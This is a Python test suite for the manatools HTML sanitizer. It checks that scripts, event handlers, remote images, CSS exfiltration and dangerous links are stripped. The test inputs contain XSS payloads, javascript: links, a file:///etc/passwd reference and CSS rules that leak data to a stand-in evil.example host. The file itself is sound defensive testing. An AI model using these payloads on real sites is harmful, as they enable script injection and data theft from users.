#!/usr/bin/env python3

"""Headless checks for the YHtmlView HTML hardening (manatools.aui.yui_html).

Feeds hostile samples (scripts, event handlers, remote images, CSS
exfiltration, javascript: links, cid: images, giant/nested tables) through
sanitize_html() and asserts nothing active or remote survives.  No UI backend
is needed.

Run directly: python3 test/test_htmlview_sanitizer.py   (exit 0 = pass)
"""

import os
import re
import sys
import time

# allow running from repo root
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from manatools.aui import yui_html  # noqa: E402

PNG_1PX = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000d49444154789c63f8cfc0f01f00050001ff89993d1d0000000049454e44ae426082")

FAILURES = []


def check(name, cond, detail=""):
    if cond:
        print(f"ok   {name}")
    else:
        print(f"FAIL {name} {detail}")
        FAILURES.append(name)


def sanitize(src, **kw):
    return yui_html.sanitize_html(src, **kw)


def test_active_content():
    r = sanitize(
        '<p onclick="steal()">hi<script>alert(1)</script></p>'
        '<img src=x onerror=alert(1)>'
        '<iframe src="https://evil.example"></iframe>'
        '<object data="x.swf"></object><embed src="x.swf">'
        '<svg><script>alert(1)</script></svg>'
        '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'
        '<form action="https://evil.example"><input name=q><button>Go</button></form>'
        '<meta http-equiv="refresh" content="0;url=https://evil.example">'
        '<base href="https://evil.example/">'
        '<template><img src=x></template>'
        '<noscript><img src="https://track.example/p.gif"></noscript>')
    body = r.body.lower()
    for bad in ("<script", "onclick", "onerror", "<iframe", "<object", "<embed",
                "<svg", "<math", "<form", "<input", "<meta", "<base", "<template",
                "javascript:", "evil.example", "track.example"):
        check(f"active: no {bad!r}", bad not in body, r.body)
    check("active: button text kept", "Go" in r.body, r.body)
    check("active: paragraph text kept", "hi" in r.body, r.body)


def test_links():
    r = sanitize(
        '<a href="https://example.com/a?b=1&amp;c=2">ok</a>'
        '<a href="java\nscript:alert(1)">js</a>'
        '<a href=" JAVASCRIPT:alert(1)">js2</a>'
        '<a href="vbscript:x">vb</a>'
        '<a href="data:text/html,<script>alert(1)</script>">data</a>'
        '<a href="mailto:me@example.com">mail</a>'
        '<a href="relative/page.html">rel</a>'
        '<a href="https://example.com" target="_blank" ping="https://t.example">t</a>')
    check("links: only safe targets kept",
          r.links == ["https://example.com/a?b=1&c=2", "mailto:me@example.com",
                      "relative/page.html", "https://example.com"], r.links)
    hrefs = re.findall(r'href="([^"]*)"', r.body)
    check("links: hrefs are opaque", all(h.startswith(yui_html.LINK_PREFIX) for h in hrefs), hrefs)
    check("links: index round-trip",
          [yui_html.link_index_from_url(h) for h in hrefs] == list(range(len(r.links))), hrefs)
    check("links: target/ping dropped", "target=" not in r.body and "ping=" not in r.body, r.body)
    check("links: real url shown as title", 'title="https://example.com/a?b=1&amp;c=2"' in r.body, r.body)

    based = sanitize('<base href="https://news.example/x/"><a href="item?id=3">i</a>',
                     resolve_base=True)
    check("links: DocumentBase resolves", based.links == ["https://news.example/x/item?id=3"], based.links)
    unbased = sanitize('<base href="https://news.example/x/"><a href="item?id=3">i</a>')
    check("links: NoBase reports verbatim", unbased.links == ["item?id=3"], unbased.links)

    custom = sanitize('<a href="https://x.example">x</a>', link_href=lambda n: f"/htmlview/tok/link/{n}")
    check("links: custom link_href", 'href="/htmlview/tok/link/0"' in custom.body, custom.body)


def test_remote_and_cid():
    src = ('<img src="https://track.example/p.gif" width=1 height=1>'
           '<table background="http://x.example/bg.png"><tr><td>t</td></tr></table>'
           '<div style="background:url(https://x.example/a.png); color: red">c</div>'
           '<img src="cid:logo@mail">'
           '<img src="cid:missing@mail" alt="gone">'
           '<img src="data:image/png;base64,iVBORw0KGgo=">'
           '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">'
           '<img src="file:///etc/passwd">')
    blocked = sanitize(src, cid_resolver=lambda cid: (PNG_1PX, "image/png") if cid == "logo@mail" else None)
    check("remote: none loaded when blocked", "x.example" not in blocked.body and "track.example" not in blocked.body, blocked.body)
    check("remote: blocked counted", blocked.remote_blocked == 3, blocked.remote_blocked)
    check("remote: colour kept", "color: red" in blocked.body, blocked.body)
    check("cid: inlined as data uri", "data:image/png;base64," + __import__("base64").b64encode(PNG_1PX).decode() in blocked.body, blocked.body)
    check("cid: unresolved dropped, alt kept", 'alt="gone"' in blocked.body and "cid:" not in blocked.body, blocked.body)
    check("data: raster kept, svg dropped", "data:image/png;base64,iVBORw0KGgo=" in blocked.body and "svg+xml" not in blocked.body, blocked.body)
    check("file: dropped", "file:" not in blocked.body, blocked.body)
    check("csp: data only", "img-src data:;" in blocked.document, blocked.document[:300])

    allowed = sanitize(src, allow_remote=True)
    check("remote: loaded when allowed", "https://track.example/p.gif" in allowed.body and allowed.remote_blocked == 0, allowed.body)
    check("csp: remote images allowed", "img-src data: http: https:" in allowed.document, allowed.document[:300])


def test_css():
    r = sanitize(
        '<style>@import url(https://evil.example/x.css);'
        'input[value^="a"] { background: url(https://evil.example/?a) }'
        '.x { width: expression(alert(1)); color: blue }'
        '.y { background: u\\72l(https://evil.example/y) }'
        '@font-face { font-family: f; src: url(https://evil.example/f.woff) }'
        '@media (max-width: 600px) { .z { color: green } }'
        '.w { -moz-binding: url(x.xml#b); behavior: url(x.htc) }'
        '</style>'
        '<style>p{color:red}</style><p>x</p>'
        '<div style="color: red; background-image: URL( \'https://evil.example/s\' )">s</div>'
        '<div style="x: </style><script>alert(1)</script>">q</div>')
    body = r.body
    check("css: no remote", "evil.example" not in body, body)
    check("css: no expression/binding/behavior", not re.search(r"expression|binding|behavior", body), body)
    check("css: no @import/@font-face", "@import" not in body and "@font-face" not in body, body)
    check("css: escapes rejected", "\\" not in body, body)
    check("css: benign rules kept", "color: blue" in body and "p { color: red }" in body, body)
    check("css: @media kept", "@media (max-width: 600px)" in body and "color: green" in body, body)
    check("css: style breakout neutralized", "<script" not in body, body)


def test_structure_and_limits():
    r = sanitize('<html><head><title>T</title></head><body bgcolor="#ffeedd" text="red" onload="x()">'
                 '<b>bold<i>both</b>italic?</i><p>unclosed<div>nested')
    check("structure: body folded into div", 'class="mana-html-body"' in r.body and "<body" not in r.body, r.body)
    check("structure: bgcolor converted", "background-color: #ffeedd" in r.body, r.body)
    check("structure: no onload", "onload" not in r.body, r.body)
    check("structure: title dropped", ">T<" not in r.body, r.body)
    opens = len(re.findall(r"<(div|p|b|i)\b", r.body))
    closes = len(re.findall(r"</(div|p|b|i)>", r.body))
    check("structure: tags balanced", opens == closes, r.body)

    deep = "<div>" * 5000 + "deep" + "</div>" * 5000
    t0 = time.time()
    rd = sanitize(deep)
    check("limits: nesting capped", rd.body.count("<div") <= yui_html.MAX_DEPTH + 1 and "deep" in rd.body)
    check("limits: nesting fast", time.time() - t0 < 5, time.time() - t0)

    giant = "<table>" + "<tr>" + "<td>cell</td>" * 50 + "</tr>" * 1 + ("<tr>" + "<td>c</td>" * 50 + "</tr>") * 4000 + "</table>"
    t0 = time.time()
    rg = sanitize(giant)
    check("limits: giant table handled", "<table>" in rg.body and time.time() - t0 < 10, time.time() - t0)

    huge = "x" * (yui_html.MAX_INPUT_CHARS + 1000)
    check("limits: input truncated", len(sanitize(huge).body) <= yui_html.MAX_INPUT_CHARS)

    check("robust: garbage input", isinstance(sanitize("<<<a href=>><img src=<>>&#xZZ;").body, str))
    check("robust: None input", sanitize(None).body == "")


def test_text_rendering():
    r = sanitize('<h1>Title</h1><p>Hello <b>bold</b> and <a href="https://e.example">link</a>.</p>'
                 '<ul><li>one</li><li>two</li></ul><ol><li>a</li><li>b</li></ol>'
                 '<blockquote>quoted</blockquote><table><tr><td>c1</td><td>c2</td></tr></table>'
                 '<style>p{color:red}</style><pre>  keep\n  spaces</pre><hr>'
                 '<img src="cid:x" alt="logo"><p>a &lt;tag&gt; &amp; stuff</p>')
    lines = yui_html.html_to_lines(r.body)
    text = "\n".join("".join(s["text"] for s in line) for line in lines)
    check("text: heading", lines[0][0]["text"] == "Title" and lines[0][0]["bold"], lines[0])
    check("text: inline flow", "Hello bold and link." in text, text)
    check("text: link indexed", any(s["link"] == 0 and s["text"] == "link" for line in lines for s in line))
    check("text: bullets", "• one" in text and "• two" in text, text)
    check("text: numbering", "1. a" in text and "2. b" in text, text)
    check("text: quote prefix", "> quoted" in text, text)
    check("text: table cells", "c1 | c2" in text, text)
    check("text: css not shown", "color:red" not in text, text)
    check("text: pre kept", "  keep" in text and "  spaces" in text, text)
    check("text: img alt", "[logo]" in text, text)
    check("text: entities decoded", "a <tag> & stuff" in text, text)

    pango = yui_html.lines_to_pango(lines)
    check("pango: link markup", f'<a href="{yui_html.LINK_PREFIX}0">' in pango, pango)
    check("pango: escaped", "&lt;tag&gt; &amp; stuff" in pango, pango)
    simple = yui_html.lines_to_simple_html(lines)
    check("simple: br separated", "<br>" in simple and f'<a href="{yui_html.LINK_PREFIX}0">' in simple, simple)


if __name__ == '__main__':
    test_active_content()
    test_links()
    test_remote_and_cid()
    test_css()
    test_structure_and_limits()
    test_text_rendering()
    print()
    if FAILURES:
        print(f"{len(FAILURES)} check(s) failed: {', '.join(FAILURES)}")
        sys.exit(1)
    print("all checks passed")
